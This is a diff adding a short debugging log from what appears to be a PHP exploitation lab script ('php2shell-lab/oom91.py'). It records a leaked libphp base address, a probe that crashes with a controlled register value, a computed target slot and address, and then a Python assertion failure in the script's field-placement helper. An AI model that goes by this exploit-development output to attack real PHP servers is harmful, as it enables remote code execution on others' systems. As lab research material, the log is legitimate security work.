@@ -1,0 +1,17 @@
+=== oom91: corrected-model converge ===
+    libphp = 0x7f84b6321000
+[cycle 1] PROBE
+  [p0] fire0 (9210000): ERR [crash]
+    rdi=0x5a5a5a5a5a5a5a01 -> slot=8 VA0=0x7f84b3c01718
+[cycle 2] AIM slot=8 P=0x7f84b3c01730
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom91.py", line 208, in <module>
+    r = fire_cycle("a%d" % cycle, aim_tile(base, VA0, S))
+                                  ~~~~~~~~^^^^^^^^^^^^^^
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom91.py", line 109, in aim_tile
+    put(S, struct.pack("<Q", fa))
+    ~~~^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom91.py", line 88, in put
+    assert not (S <= off < S + 12 or (S + 12 > 176 and off < S + 12 - 176)), \
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError: field at 8 hits aim-clobber [8,20)
